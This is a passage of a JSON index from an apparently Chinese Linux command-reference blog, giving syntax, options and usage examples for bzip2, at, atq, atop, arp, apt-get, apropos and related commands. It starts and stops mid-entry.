两位数字表示的年(99) %Y 当前月份 %% 百分号(%) ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"awk","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/awk/","stats":{"text":"33 min read","time":1960000,"words":7865,"minutes":33},"date":"2022-01-30 18:39:51","dateFormat":"2022-01-30"},{"content":"将文件压缩成 bz2 格式。 补充说明 bzip2 命令用于创建和管理（包括解压缩）.bz2 格式的压缩包。 bzip2 采用 Burrows-Wheeler 块排序文本压缩算法和 Huffman 编码方式压缩文件。 压缩率一般比基于 LZ77/LZ78 的压缩软件好得多，其性能接近 PPM 族统计类压缩软件。 命令行参数有意设计为非常接近 GNU gzip 的形式，但也不完全相同。 bzip2 从命令行读入文件名和参数。 每个文件被名为 &quot;原始文件名.bz2&quot; 的压缩文件替换。 每个压缩文件具有与原文件相同的修改时间、 权限， 如果可能的话，还具有相同的属主， 因此在解压缩时这些特性将正确地恢复。 在某些文件系统中， 没有权限、 属主或时间的概念， 或者对文件名的长度有严格限制， 例如 MSDOS，在这种情况下，bzip2 没有保持原文件名、 属主、 权限以及时间的机制， 从这个意义上说，bzip2 对文件名的处理是幼稚的。 bzip2 和 bunzip2 在缺省情况下不覆盖已有的文件。 如果想覆盖已有的文件，要指定 -f 选项。 如果未指定文件名， bzip2 将压缩来自标准输入的数据并写往标准输出。在这种情况下， bzip2 会拒绝将压缩结果写往终端，因为这完全无法理解并且是没有意义的。 bunzip2 (以及 bzip2 -d) 对所有指定的文件进行解压缩处理。不是由 bzip2 产生的文件将被忽略，同时发出一个警告信息。 bzip2 按下列方式由压缩文件名确定解压后的文件名： filename.bz2 解压成 filename filename.bz 解压成 filename filename.tbz2 解压成 filename.tar filename.tbz 解压成 filename.tar anyothername 解压成 anyothername.out 如果文件名的后缀不是下列之一： .bz2, .bz, .tbz2 或 .tbz, .bzip2 将抱怨无法确定原始文件名，并采用原文件名加 .out 作为解压缩文件名。 在压缩时，如果不提供文件名，bzip2 将从标准输入读取数据，压缩结果写往标准输出。 bzip2 采用 32 位 CRC 校验码作自我检查，以确认解压后的文件与原始文件相同。 这可用于检测压缩文件是否损坏，并防止 bzip2 中未知的缺陷（运气好的话这种可能性非常小）。 数据损坏而未检测到的几率非常之小， 对于每个被处理的文件大约是四十亿分之一。 检查是在解压缩时进行的，因此它只能说明某个地方出问题了。 它能帮助恢复原始未压缩的数据。可以用 bzip2recover 来尝试从损坏的文件中恢复数据。 返回值：正常退出返回 0， 出现环境问题返回 1 （文件未找到，非法的选项，I/O错误等）， 返回 2 表明压缩文件损坏，出现导致 bzip2 紧急退出的内部一致性错误（例如缺陷）时返回 3。 语法 bzip2 [ -cdfkqstvzVL123456789 ] [ filenames ... ] 选项 -c --stdout # 将数据压缩或解压缩至标准输出。 -d --decompress # 强制解压缩。 bzip2, bunzip2 以及 bzcat 实际上是同一个程序，进行何种操作将根据程序名确定。 指定该选项后将不考虑这一机制，强制 bzip2 进行解压缩。 -z --compress # -d 选项的补充：强制进行压缩操作，而不管执行的是哪个程序。 -t --test # 检查指定文件的完整性，但并不对其解压缩。 实际上将对数据进行实验性的解压缩操作，而不输出结果。 -f --force # 强制覆盖输出文件。通常 bzip2 不会覆盖已经存在的文件。该选项还强制 bzip2 打破文件的硬连接，缺省情况下 bzip2 不会这么做。 -k --keep # 在压缩或解压缩时保留输入文件（不删除这些文件）。 -s --small # 在压缩、解压缩及检查时减少内存用量。采用一种修正的算法进行压缩和测试，每个数据块仅需要 2.5 个字节。这意味着任何文件都可以在 2300k # 的内存中进行解压缩， 尽管速度只有通常情况下的一半。 # 在压缩时，-s将选定 200k 的块长度，内存用量也限制在 200k 左右， 代价是压缩率会降低。 总之，如果机器的内存较少（8兆字节或更少）， # 可对所有操作都采用-s选项。参见下面的内存管理。 -q --quiet # 压制不重要的警告信息。属于 I/O 错误及其它严重事件的信息将不会被压制。 -v --verbose # 详尽模式 -- 显示每个被处理文件的压缩率。 命令行中更多的 -v 选项将增加详细的程度， 使 bzip2 显示出许多主要用于诊断目的信息。 -L --license -V --version # 显示软件版本，许可证条款及条件。 -1 to -9 # 在压缩时将块长度设为 100 k、200 k .. 900 k。 对解压缩没有影响。参见下面的内存管理。 -- # 将所有后面的命令行变量看作文件名，即使这些变量以减号&quot;-&quot;打头。 可用这一选项处理以减号&quot;-&quot;打头的文件名， 例如：bzip2 -- -myfilename. --repetitive-fast --repetitive-best # 这些选项在 0.9.5 及其以上版本中是多余的。 在较早的版本中，这两个选项对排序算法的行为提供了一些粗糙的控制，有些情况下很有用。 0.9.5 # 及其以上版本采用了改进的算法而与这些选项无关。 参数 文件：指定要压缩的文件。 实例 压缩指定文件 filename bzip2 filename 或 bzip2 -z filename 这里，压缩的时候不会输出，会将原来的文件 filename 给删除，替换成 filename.bz2 如果以前有 filename.bz2 则不会替换并提示错误（如果想要替换则指定 -f 选项，例如bzip2 -f filename；如果 filename 是目录则也提醒错误不做任何操作；如果 filename 已经是压过的了有 bz2 后缀就提醒一下，不再压缩，没有 bz2 后缀会再次压缩。 解压指定的文件 filename.bz2 bzip2 -d filename.bz2 或 bunzip2 filename.bz2 这里，解压的时候没标准输出，会将原来的文件 filename.bz2 给替换成 filename。如果以前有 filename 则不会替换并提示错误（如果想要替换则指定-f选项，例如bzip2 -df filename.bz2。 压缩解压的时候将结果也输出 $bzip2 -v filename 输入之后，输出如下： filename: 0.119:1, 67.200 bits/byte, -740.00% saved, 5 in, 42 out. 这里，加上-v选项就会输出了,只用压缩举例了，解压的时候同理bzip2 -dv filename.bz2不再举例了。 模拟解压实际并不解压 bzip2 -tv filename.bz2 输入之后，输出如下： filename.bz2: ok 这里，-t指定要进行模拟解压，不实际生成结果，也就是说类似检查文件,当然就算目录下面有 filename 也不会有什么错误输出了，因为它根本不会真的解压文件。为了在屏幕上输出，这里加上-v选项了,如果是真的解压bzip2 -dv filename.bz2则输出的是把&quot;ok&quot;替换成了&quot;done&quot;。 压缩解压的时候，除了生成结果文件，将原来的文件也保存 bzip2 -k filename 这里，加上 -k 就保存原始的文件了，否则原始文件会被结果文件替代。只用压缩举例了，解压的时候同理$bzip2 -dk filename.bz2不再举例了。 解压到标准输出 bzip2 -dc filename.bz2 输入之后，输出如下： hahahhaahahha 这里，使用-c指定到标准输出，输出的是文件 filename 的内容，不会将 filename.bz2 删除。 压缩到标准输出 bzip2 -c filename bzip2: I won't write compressed data to a terminal. bzip2: For help, type: `bzip2 --help'. 这里，使用-c指定压缩到标准输出不删除原有文件，不同的是，压缩后的文件无法输出到标准输出。 使用bzip2的时候将所有后面的看作文件(即使文件名以'-'开头)： bzip2 -- -myfilename 这里主要是为了防止文件名中-产生以为是选项的歧义。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"bzip2","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/bzip2/","stats":{"text":"8 min read","time":467000,"words":2113,"minutes":8},"date":"2022-01-30 18:39:32","dateFormat":"2022-01-30"},{"content":"使用正则表达式搜索 .bz2 压缩包中文件。 补充说明 bzgrep 命令使用正则表达式搜索 .bz2 压缩包中文件，将匹配的行显示到标注输出。 语法 bzgrep (参数) 参数 搜索模式：指定要搜索的模式。 .bz2 文件：指定要搜索的.bz2压缩包。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"bzgrep","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/bzgrep/","stats":{"text":"1 min read","time":17000,"words":83,"minutes":1},"date":"2022-01-30 17:53:25","dateFormat":"2022-01-30"},{"content":"比较两个压缩包中的文件。 补充说明 bzcmp 命令主要功能是在不真正解压缩 .bz2 压缩包的情况下，比较两个压缩包中的文件，省去了解压缩后在调用 cmp 命令的过程。 语法 bzcmp (参数) 参数 文件1：指定要比较的第一个 .bz2 压缩包。 文件2：指定要比较的第二个 .bz2 压缩包。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"bzcmp","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/bzcmp/","stats":{"text":"1 min read","time":22000,"words":104,"minutes":1},"date":"2022-01-30 17:47:42","dateFormat":"2022-01-30"},{"content":"删除待执行任务队列中的指定任务。 补充说明 atrm 命令用于删除待执行任务队列中的指定任务。 语法 atrm (选项) (参数) 选项 -V：显示版本号。 参数 任务号：指定待执行队列中要删除的任务。 实例 删除已经排队的任务。 atq # 显示当前已经设置的任务 2 Mon May 17 08:00:00 2010 a root 1 Sat May 15 17:00:00 2010 a root atrm 2 # 删除任务2 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"atrm","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/atrm/","stats":{"text":"1 min read","time":29000,"words":123,"minutes":1},"date":"2022-01-30 16:47:06","dateFormat":"2022-01-30"},{"content":"列出当前用户的 at 任务列表。 补充说明 atq 命令 显示系统中待执行的任务列表，也就是列出当前用户的 at 任务列表。 语法 atq [-V] [-q 队列] [-v] 选项 -V：显示版本号； -q：查询指定队列的任务。 实例 at now + 10 minutes at&gt; echo 1111 at&gt; &lt;eot&gt; job 3 at Fri Apr 26 12:56:00 2013 atq 3 Fri Apr 26 12:56:00 2013 a root ··· ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"atq","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/atq/","stats":{"text":"1 min read","time":29000,"words":109,"minutes":1},"date":"2022-01-30 16:33:08","dateFormat":"2022-01-30"},{"content":"监控Linux系统资源与进程的工具。 补充说明 [非内部程序，需要安装] 它以一定的频率记录系统的运行状态，所采集的数据包含系统资源（CPU、内存、磁盘和网络）使用情况和进程运行情况，并能以日志文件的方式保存在磁盘中，服务器出现问题后，我们可获取相应的atop日志文件进行分析。atop 是一款开源软件，我们可以从这里获得其源码和 rpm 安装包。 语法 atop (选项) (参数) 说明 ATOP 列：该列显示了主机名、信息采样日期和时间点 PRC 列：该列显示进程整体运行情况 sys、usr字段分别指示进程在内核态和用户态的运行时间 #proc字段指示进程总数 #zombie字段指示僵死进程的数量 #exit字段指示atop采样周期期间退出的进程数量 CPU列：该列显示CPU整体(即多核CPU作为一个整体CPU资源)的使用情况，我们知道CPU可被用于执行进程、处理中断，也可处于空闲状态(空闲状态分两种，一种是活动进程等待磁盘IO导致CPU空闲，另一种是完全空闲) sys、usr字段指示CPU被用于处理进程时，进程在内核态、用户态所占CPU的时间比例 irq字段指示CPU被用于处理中断的时间比例 idle字段指示CPU处在完全空闲状态的时间比例 wait字段指示CPU处在“进程等待磁盘IO导致CPU空闲”状态的时间比例 CPU列各个字段指示值相加结果为N00%，其中N为cpu核数。 CPU 列：该列显示某一核cpu的使用情况，各字段含义可参照CPU列，各字段值相加结果为100% CPL 列：该列显示CPU负载情况 avg1、avg5和avg15字段：过去1分钟、5分钟和15分钟内运行队列中的平均进程数量 csw字段指示上下文交换次数 intr字段指示中断发生次数 MEM列：该列指示内存的使用情况 tot字段指示物理内存总量 free字段指示空闲内存的大小 cache字段指示用于页缓存的内存大小 buff字段指示用于文件缓存的内存大小 slab字段指示系统内核占用的内存大小 SWP列：该列指示交换空间的使用情况 tot字段指示交换区总量 free字段指示空闲交换空间大小 PAG列：该列指示虚拟内存分页情况 swin、swout字段：换入和换出内存页数 DSK列：该列指示磁盘使用情况，每一个磁盘设备对应一列，如果有sdb设备，那么增多一列DSK信息 sda字段：磁盘设备标识 busy字段：磁盘忙时比例 read、write字段：读、写请求数量 NET列：多列NET展示了网络状况，包括传输层(TCP和UDP)、IP层以及各活动的网口信息 XXXi 字段指示各层或活动网口收包数目 XXXo 字段指示各层或活动网口发包数目 atop日志 每个时间点采样页面组合起来就形成了一个atop日志文件，我们可以使用&quot;atop -r XXX&quot;命令对日志文件进行查看。那以什么形式保存atop日志文件呢？ 对于atop日志文件的保存方式，我们可以这样： 每天保存一个atop日志文件，该日志文件记录当天信息 日志文件以&quot;atop_YYYYMMDD&quot;的方式命名 设定日志失效期限，自动删除一段时间前的日志文件 其实atop开发者已经提供了以上日志保存方式，相应的atop.daily脚本可以在源码目录下找到。在atop.daily脚本中，我们可以通过修改INTERVAL变量改变atop信息采样周期(默认为10分钟)；通过修改以下命令中的数值改变日志保存天数(默认为28天)： (sleep 3; find $LOGPATH -name 'atop_*' -mtime +28 -exec rm {} \\; )&amp; 最后，我们修改cron文件，每天凌晨执行atop.daily脚本： 0 0 * * * root /etc/cron.daily/atop.daily ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"atop","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/atop/","stats":{"text":"4 min read","time":234000,"words":1080,"minutes":4},"date":"2022-01-30 16:24:55","dateFormat":"2022-01-30"},{"content":"在指定时间执行一个任务。 补充说明 at 命令用于在指定时间执行命令。at 允许使用一套相当复杂的指定时间的方法。它能够接受在当天的 hh:mm（小时:分钟）式的时间指定。假如该时间已过去，那么就放在第二天执行。当然也能够使用 midnight（深夜），noon（中午），teatime（饮茶时间，一般是下午4点）等比较模糊的 词语来指定时间。用户还能够采用12小时计时制，即在时间后面加上 AM（上午）或 PM（下午）来说明是上午还是下午。 也能够指定命令执行的具体日期，指定格式为 month day（月 日）或 mm/dd/yy（月/日/年）或 dd.mm.yy（日.月.年）。指定的日期必须跟在指定时间的后面。 上面介绍的都是绝对计时法，其实还能够使用相对计时法，这对于安排不久就要执行的命令是很有好处的。指定格式为：now + count time-units，now 就是当前时间，time-units 是时间单位，这里能够是 minutes（分钟）、hours（小时）、days（天）、weeks（星期）。count 是时间的数量，究竟是几天，还是几小时，等等。 更有一种计时方法就是直接使用 today（今天）、tomorrow（明天）来指定完成命令的时间。 语法 at [-V] [-q 队列] [-f 文件] [-mldbv] 时间 at -c 作业 [作业...] 选项 -f：指定包含具体指令的任务文件； -q：指定新任务的队列名称； -l：显示待执行任务的列表； -d：删除指定的待执行任务； -m：任务执行完成后向用户发送E-mail。 参数 日期时间：指定任务执行的日期时间。 实例 三天后的下午 5 点钟执行/bin/ls： [root@localhost ~]# at 5pm+3 days at&gt; /bin/ls at&gt; &lt;EOT&gt; job 7 at 2013-01-08 17:00 明天17点钟，输出时间到指定文件内： [root@localhost ~]# at 17:20 tomorrow at&gt; date &gt;/root/2013.log at&gt; &lt;EOT&gt; job 8 at 2013-01-06 17:20 计划任务设定后，在没有执行之前我们可以用atq命令来查看系统没有执行工作任务： [root@localhost ~]# atq 8 2013-01-06 17:20 a root 7 2013-01-08 17:00 a root 删除已经设置的任务： [root@localhost ~]# atq 8 2013-01-06 17:20 a root 7 2013-01-08 17:00 a root [root@localhost ~]# atrm 7 [root@localhost ~]# atq 8 2013-01-06 17:20 a root 显示已经设置的任务内容： [root@localhost ~]# at -c 8 #!/bin/sh # atrun uid=0 gid=0 # mail root 0 umask 22此处省略n个字符 date &gt;/root/2013.log ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"at","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/at/","stats":{"text":"3 min read","time":163000,"words":664,"minutes":3},"date":"2022-01-30 16:21:43","dateFormat":"2022-01-30"},{"content":"汇编语言编译器。 补充说明 as 命令 GNU 组织推出的一款汇编语言编译器，它支持多种不同类型的处理器。 语法 as (选项) (参数) 选项 -ac：忽略失败条件； -ad：忽略调试指令； -ah：包括高级源； -al：包括装配； -am：包括宏扩展； -an：忽略形式处理； -as：包括符号； =file：设置列出文件的名字； --alternate：以交互宏模式开始； -f：跳过空白和注释预处理； -g：产生调试信息； -J：对于有符号溢出不显示警告信息； -L：在符号表中保留本地符号； -o：指定要生成的目标文件； --statistics：打印汇编所用的最大空间和总时间。 参数 汇编文件：指定要汇编的源文件。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"as","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/as/","stats":{"text":"1 min read","time":43000,"words":200,"minutes":1},"date":"2022-01-30 16:19:33","dateFormat":"2022-01-30"},{"content":"监听网络上 ARP 的记录。 补充说明 arpwatch 命令用来监听网络上 arp 的记录。 语法 arpwatch (选项) 选项 -d：启动排错模式； -f&lt;记录文件&gt;：设置存储ARP记录的文件，预设为/var/arpwatch/arp.dat； -i&lt;接口&gt;：指定监听ARP的接口，预设的接口为eth0； -r&lt;记录文件&gt;：从指定的文件中读取ARP记录，而不是从网络上监听。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"arpwatch","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/arpwatch/","stats":{"text":"1 min read","time":26000,"words":113,"minutes":1},"date":"2022-01-30 16:17:55","dateFormat":"2022-01-30"},{"content":"管理 ARP 包过滤规则表。 补充说明 arptables 命令 用来设置、维护和检查 Linux 内核中的 arp 包过滤规则表。 语法 arptables (选项) 选项 -A：向规则链中追加规则； -D：从指定的链中删除规则； -l：向规则链中插入一条新的规则； -R：替换指定规则； -P：设置规则链的默认策略； -F：刷新指定规则链，将其中的所有规则链删除，但是不改变规则链的默认策略； -Z：将规则链计数器清零； -L：显示规则链中的规则列表； -X：删除指定的空用户自定义规则链； -h：显示指令帮助信息； -j：指定满足规则的添加时的目标； -s：指定要匹配ARP包的源ip地址； -d：指定要匹配ARP包的目的IP地址。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"arptables","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/arptables/","stats":{"text":"1 min read","time":46000,"words":214,"minutes":1},"date":"2022-01-30 16:15:28","dateFormat":"2022-01-30"},{"content":"收集免费 ARP 信息。 补充说明 arpd 命令 是用来收集免费 arp 信息的一个守护进程，它将收集到的信息保存在磁盘上或者在需要时，提供给内核用户用于避免多余广播。 语法 arpd (选项) (参数) 选项 -l：将arp数据库输出到标准输出设备显示并退出； -f：指定读取和加载arpd数据库的文本文件，文件的格式与“-l”输出信息类似； -b：指定arpd数据库文件，默认的位置为“/var/lib/arpd.db”； -a：指定目标被认为死掉前查询的次数； -k：禁止通过内核发送广播查询； -n：设定缓冲失效时间。 参数 网络接口：指定网络接口。 实例 启动 arpd 进程： arpd -b /var/tmp/arpd.db 运行一段时间后，查看结果： arpd -l -b /var/tmp/arpd.db ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"arpd","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/arpd/","stats":{"text":"1 min read","time":50000,"words":225,"minutes":1},"date":"2022-01-30 16:11:49","dateFormat":"2022-01-30"},{"content":"arp 命令用于显示和修改 IP 到 MAC 转换表。 补充说明 arp 命令 是 Address Resolution Protocol，地址解析协议，是通过解析网络层地址来找寻数据链路层地址的一个网络协议包中极其重要的网络传输协议。而该命令可以显示和修改 arp 协议解析表中的缓冲数据。 这个核心协议模块实现RFC826中定义的 Address Resolution Protocol [译注：即TCP/IP的第三层到第一层的地址转换协议]，用于在直接相连的网络中换第二层硬件地址和 Ipv4 协议地址之间的转换。 用户除非想对其进行配置，否则一般不会直接操作这个模块。 实际上，它提供对核心中其它协议的服务。 用户进程可以使用 packet(7) 的 sockets，收到 ARP 包（译注：一译分组）。 还有一种机制是使用 netlink(7) sockets，在用户空间管理 ARP 缓存的机制。我们也可以通过 ioctl (2) 控制任意 PF_INET socket上的 ARP 表 ARP 模块维护一个硬件地址到协议地址映射的缓存。这个缓存有大小限制，所以不常用的和旧的记录（Entry）将被垃圾收集器清除（garbage-collected），垃圾收集器永远不能删除标为永久的记录。我们可以使用ioctls直接操纵缓冲， 并且其性状可以用下面定义的 sysctl 调节。 如果在限定的时间（见下面的sysctl）内，一条现存映射没有肯定反馈时， 则认为相邻层的缓存记录失效。 为了再次向目标发送数据，ARP将首先试着询问本地arp进程 app_solicit 次，获取更新了的 MAC（介质访问控制）地址。 如果失败，并且旧的MAC地址是已知的，则发送 ucast_solicit 次的 unicast probe。如果仍然失败，则将向网络广播一个新的ARP请求,此时要 有待发送数据的队列 如果 Linux 接到一个地址请求，而且该地址指向 Linux 转发的地址，并且接收接口打开了代理 arp 时，Linux 将自动添加一条非永久的代理 arp 记录；如果存在拒绝到目标的路由，则不添加代理 arp 记录。 语法 arp（选项）（参数） 选项 -a # 主机 ：显示 arp 缓冲区的所有条目； -H # 地址类型 ：指定 arp 指令使用的地址类型； -d # 主机 ：从 arp 缓冲区中删除指定主机的 arp 条目； -D # 使用指定接口的硬件地址； -e # 以 Linux 的显示风格显示 arp 缓冲区中的条目； -i # 接口 ：指定要操作 arp 缓冲区的网络接口； -s # 主机 MAC 地址 ：设置指定的主机的 IP 地址与 MAC 地址的静态映射； -n # 以数字方式显示 arp 缓冲区中的条目； -v # 显示详细的 arp 缓冲区条目，包括缓冲区条目的统计信息； -f # 文件 ：设置主机的 IP 地址与 MAC 地址的静态映射。 参数 主机：查询 arp 缓冲区中指定主机的 arp 条目。 实例 显示arp 缓冲区内容 [root@localhost ~]# arp -v Address HWtype HWaddress Flags Mask Iface 192.168.0.134 ether 00:21:5E:C7:4D:88 C eth1 115.238.144.129 ether 38:22:D6:2F:B2:F1 C eth0 Entries: 2 Skipped: 0 Found: 2 添加静态 arp 映射 arp -s IP MAC-ADDRESS arp -s 192.168.1.1 00:b1:b2:b3:b4:b5 删除 arp 缓存条目 arp -d 192.168.1.1 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"arp","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/arp/","stats":{"text":"4 min read","time":201000,"words":882,"minutes":4},"date":"2022-01-30 16:08:21","dateFormat":"2022-01-30"},{"content":"用于创建和管理.arj压缩包。 补充说明 arj 命令是 .arj 格式的压缩文件的管理器，用于创建和管理 .arj 压缩包。 语法 arj (参数) 参数 操作指令：对 .arj 压缩包执行的操作指令； 压缩包名称：指定要操作的 arj 压缩包名称。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"arj","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/arj/","stats":{"text":"1 min read","time":17000,"words":82,"minutes":1},"date":"2022-01-30 16:07:00","dateFormat":"2022-01-30"},{"content":"显示当前主机的硬件架构类型。 概要 arch [OPTION]... 主要用途 打印机器架构信息；arch 命令输出结果有：i386、i486、i586、alpha、sparc、arm、m68k、mips、ppc、i686等。 选项 --help 显示帮助信息并退出。 --version 显示版本信息并退出。 例子 [root@localhost ~]# arch x86_64 注意 该命令等价于 uname -m。 该命令是 GNU coreutils 包中的命令，相关的帮助信息请查看man -s 1 arch，info coreutils 'arch invocation'。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"arch","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/arch/","stats":{"text":"1 min read","time":28000,"words":115,"minutes":1},"date":"2022-01-30 16:00:03","dateFormat":"2022-01-30"},{"content":"管理 Debian Linux 系统中的软件包密钥。 补充说明 apt-key 命令 用于管理 Debian Linux 系统中的软件包密钥。每个发布的 deb 包，都是通过密钥认证的，apt-key 用来管理密钥。 语法 apt-key (参数) 参数 操作指令：APT密钥操作指令。 实例 apt-key list # 列出已保存在系统中key。 apt-key add keyname # 把下载的key添加到本地trusted数据库中。 apt-key del keyname # 从本地trusted数据库删除key。 apt-key update # 更新本地trusted数据库，删除过期没用的key。 ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"apt-key","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/apt-key/","stats":{"text":"1 min read","time":34000,"words":144,"minutes":1},"date":"2022-01-30 15:50:12","dateFormat":"2022-01-30"},{"content":"Debian Linux 发行版中的 APT 软件包管理工具。 补充说明 apt-get 命令是 Debian Linux 发行版中的 APT 软件包管理工具。所有基于 Debian 的发行都使用这个包管理系统。deb 包可以把一个应用的文件包在一起，大体就如同 Windows 上的安装文件。 语法 apt-get (选项)(参数) 选项 -c：指定配置文件。 参数 管理指令：对APT软件包的管理操作； 软件包：指定要操纵的软件包。 实例 使用 apt-get 命令的第一步就是引入必需的软件库，Debian 的软件库也就是所有 Debian 软件包的集合，它们存在互联网上的一些公共站点上。把它们的地址加入，apt-get 就能搜索到我们想要的软件。/etc/apt/sources.list 是存放这些地址列表的配置文件，其格式如下： deb web 或 [ftp地址] [发行版名字] main/contrib/non-[free] 我们常用的 Ubuntu 就是一个基于 Debian 的发行，我们使用 apt-get 命令获取这个列表，以下是我整理的常用命令： 在修改/etc/apt/sources.list或者/etc/apt/preferences之后运行该命令。此外您需要定期运行这一命令以确保您的软件包列表是最新的： apt-get update 安装一个新软件包： apt-get install packagename 卸载一个已安装的软件包（保留配置文件）： apt-get remove packagename 卸载一个已安装的软件包（删除配置文件）： apt-get –purge remove packagename 会把已装或已卸的软件都备份在硬盘上，所以如果需要空间的话，可以让这个命令来删除你已经删掉的软件： apt-get autoclean apt 这个命令会把安装的软件的备份也删除，不过这样不会影响软件的使用的： apt-get clean 更新所有已安装的软件包： apt-get upgrade 将系统升级到新版本： apt-get dist-upgrade 定期运行这个命令来清除那些已经卸载的软件包的 .deb 文件。通过这种方式，您可以释放大量的磁盘空间。如果您的需求十分迫切，可以使用 apt-get clean 以释放更多空间。这个命令会将已安装软件包裹的 .deb 文件一并删除。大多数情况下您不会再用到这些 .debs 文件，因此如果您为磁盘空间不足而感到焦头烂额，这个办法也许值得一试： apt-get autoclean ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"apt-get","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/apt-get/","stats":{"text":"3 min read","time":141000,"words":637,"minutes":3},"date":"2022-01-30 15:45:55","dateFormat":"2022-01-30"},{"content":"在 whatis 数据库中查找字符串。 补充说明 apropos 命令在一些特定的包含系统命令的简短描述的数据库文件里查找关键字，然后把结果送到标准输出。 如果你不知道完成某个特定任务所需要命令的名称，可以使用一个关键字通过 Linux apropos 实用程序来搜索它。该实用程序可以搜索关键字并且显示所有包含匹配项的man页面的简短描述。另外，使用man实用程序和 -k（关键字）选项，可以得到和用 Linux apropos 实用程序相同的结果（实际上是相同的命令）。 语法 apropos [-dalhvV] -e|-[w|-r] [-s section] [-m system[,...]] [-M path] [-L locale] -C [file] keyword ... 选项 -d, --debug：输出调试信息。 -v, --verbose：输出详细的警告信息。 -r, -- regex：将每个keyword作为正则表达式解释。这是默认行为。每个keyword将匹配手册页和描述。 -w, --wildcard：将每个keyword作为shell样式的通配符解释。 -e, --exact：每个keyword将精确匹配手册页名字和描述。 -a, --and：只显示匹配所有keyword的手册页和描述。默认显示匹配任何keyword的项。 -l, --long：不根据终端宽度缩减输出。 -s section, --section section：只查找指定的手册section。 -m system[,...], --systems=system[,...]：用于查找其它操作系统的手册页。 -M path, --manpath=path：指定从其它以冒号分隔的手册页层次查找。默认使用$MANPATH环境变量。这个选项覆盖$MANPATH的内容。 -L locale, --locale=locale：apropos调用C函数setlocale来得到当前本地化信息，包括$LC_MESSAGE和$LANG。使用该选项提供一个locale字符串来临时更改本地化信息。 -C file, --config-file=file：使用这个用户配置文件而不是默认的~/.manpath。 -h, --help：打印帮助信息并退出。 -V, --version：打印版本信息并退出。 返回值 返回 0 表示成功，1 表示用法、语法或配置文件错误，2 表示操作错误，16 表示没有找到匹配的内容。 实例 [root@localhost ~]# man -k who at.allow [at] (5) - determine who can submit jobs via at or batch at.deny [at] (5) - determine who can submit jobs via at or batch jwhois (1) - client for the whois service jwhois (rpm) - Internet whois/nicname client. Net::LDAP::Extension::whoami (3pm) - LDAP Who am I? Operation w (1) - Show who is logged on and what they are doing who (1p) - display who is on the system who (1) - show who is logged on whoami (1) - print effective userid [root@localhost ~]# apropos who at.allow [at] (5) - determine who can submit jobs via at or batch at.deny [at] (5) - determine who can submit jobs via at or batch jwhois (1) - client for the whois service jwhois (rpm) - Internet whois/nicname client. Net::LDAP::Extension::WhoAmI (3pm) - LDAP Who am I? Operation w (1) - Show who is logged on and what they are doing who (1p) - display who is on the system who (1) - show who is logged on whoami (1) - print effective userid 查找手册页名字和描述中包含emacs和vi的手册页： apropos -a emacs vi ","tags":[{"name":"Linux命令","slug":"linux-command","used":true,"link":"https://dev-coco.github.io/tag/linux-command/"}],"title":"apropos","feature":"https://dev-coco.github.io/post-images/Linux-Command.png","link":"https://dev-coco.github.io/post/apropos/","stats":{"text":"4 min read","time":189000,"words":724,"minutes":4},"date":"2022-01-30 15:43:37","dateFormat":"2022-01-30"},{"content":"解压缩指定的 .bz2 文件。 补充说明 bzcat 命令解压缩指定的 .bz2 